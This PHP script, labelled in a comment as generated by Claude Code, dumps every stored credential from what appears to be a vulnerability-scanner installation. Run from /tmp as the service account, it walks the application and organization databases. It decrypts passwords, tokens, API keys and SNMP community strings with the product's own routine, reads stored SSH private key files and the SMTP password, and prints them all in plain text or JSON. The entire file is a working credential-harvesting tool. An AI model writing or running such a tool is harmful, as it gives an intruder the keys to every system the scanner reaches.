<?php

// generated by Claude Code
// su - tns -s /bin/bash -c '/opt/sc/support/bin/php /tmp/dump_all_creds.php 2>&1'

$GLOBALS["root"] = "/opt/sc";
require_once "/opt/sc/src/defines.php";
require_once "/opt/sc/src/lib/AuthenticationLib.php";
dbLib::setup(1, false);

$jsonMode = in_array("-json", $argv);
$results = [];

function tryDecrypt($val) {
    if (empty($val) || $val === "NULL" || $val === "") return $val;
    try {
        $dec = AuthenticationLib::decryptString($val);
        return $dec !== false ? $dec . " [DECRYPTED]" : $val;
    } catch (Exception $e) { return $val; }
}

$passCols = ["password","passphrase","escalationpassword","communitystring","secret","token","privatekey","accesskey","apikey","secretkey"];

function isPassCol($name) {
    global $passCols;
    return in_array(strtolower($name), $passCols)
        || stripos($name, "pass") !== false
        || stripos($name, "secret") !== false
        || stripos($name, "community") !== false
        || stripos($name, "token") !== false
        || stripos($name, "privatekey") !== false
        || stripos($name, "apikey") !== false
        || stripos($name, "accesskey") !== false;
}

function dumpTable($db, $table, $label) {
    global $jsonMode, $results;
    $cols = $db->query("PRAGMA table_info($table)")->fetchAll(PDO::FETCH_ASSOC);
    $colNames = array_column($cols, "name");
    $hasPass = array_filter($colNames, "isPassCol");
    if (empty($hasPass)) return;
    $count = $db->query("SELECT count(*) FROM $table")->fetchColumn();
    if ($count == 0) return;
    $rows = $db->query("SELECT * FROM $table")->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $i => $row) {
        foreach ($row as $col => $val) {
            if (isPassCol($col)) $row[$col] = tryDecrypt($val ?? "");
        }
        if ($table === "AppSSHCredential" && !empty($row["privateKey"])) {
            $keyPath = "/opt/sc/admin/uploads/" . basename($row["privateKey"]);
            $row["privateKey"] = file_exists($keyPath) ? file_get_contents($keyPath) : "[file not found: $keyPath]";
        }
        if ($jsonMode) {
            $row["_table"] = $table;
            $row["_source"] = $label;
            $results[] = $row;
        } else {
            if ($i === 0) {
                echo "\n" . str_repeat("=", 60) . "\n";
                echo "TABLE: $label.$table ($count rows)\n";
                echo str_repeat("=", 60) . "\n";
            }
            echo "  --- Row " . ($i+1) . " ---\n";
            foreach ($row as $col => $val) echo "  $col: $val\n";
        }
    }
}

$appdb = new PDO("sqlite:/opt/sc/application.db");

// Credential and Scanner tables
$tables = $appdb->query("SELECT name FROM sqlite_master WHERE type='table' AND (name LIKE '%Credential' OR name='Scanner') ORDER BY name")->fetchAll(PDO::FETCH_COLUMN);
foreach ($tables as $t) { dumpTable($appdb, $t, "application.db"); }

// Configuration table - SMTP entries
$smtpRows = $appdb->query("SELECT name, value FROM Configuration WHERE name LIKE 'SMTP%'")->fetchAll(PDO::FETCH_ASSOC);
if (!empty($smtpRows)) {
    $smtpRecord = [];
    foreach ($smtpRows as $row) { $smtpRecord[$row["name"]] = $row["value"]; }
    if (!empty($smtpRecord["SMTPPassword"])) {
        $smtpRecord["SMTPPassword"] = tryDecrypt($smtpRecord["SMTPPassword"]);
        if ($jsonMode) {
            $smtpRecord["_table"] = "Configuration";
            $smtpRecord["_source"] = "application.db";
            $results[] = $smtpRecord;
        } else {
            echo "\n" . str_repeat("=", 60) . "\n";
            echo "TABLE: application.db.Configuration (SMTP)\n";
            echo str_repeat("=", 60) . "\n";
            echo "  --- Row 1 ---\n";
            foreach ($smtpRecord as $k => $v) echo "  $k: $v\n";
        }
    }
}

// Org DBs
foreach (glob("/opt/sc/orgs/*/organization.db") as $orgdb) {
    $db2 = new PDO("sqlite:$orgdb");
    $tables2 = $db2->query("SELECT name FROM sqlite_master WHERE type='table' AND (name LIKE '%Credential' OR name='Scanner') ORDER BY name")->fetchAll(PDO::FETCH_COLUMN);
    foreach ($tables2 as $t) { dumpTable($db2, $t, $orgdb); }
}

if ($jsonMode) {
    echo json_encode($results, JSON_PRETTY_PRINT) . "\n";
} else {
    echo "\nDONE\n";
}
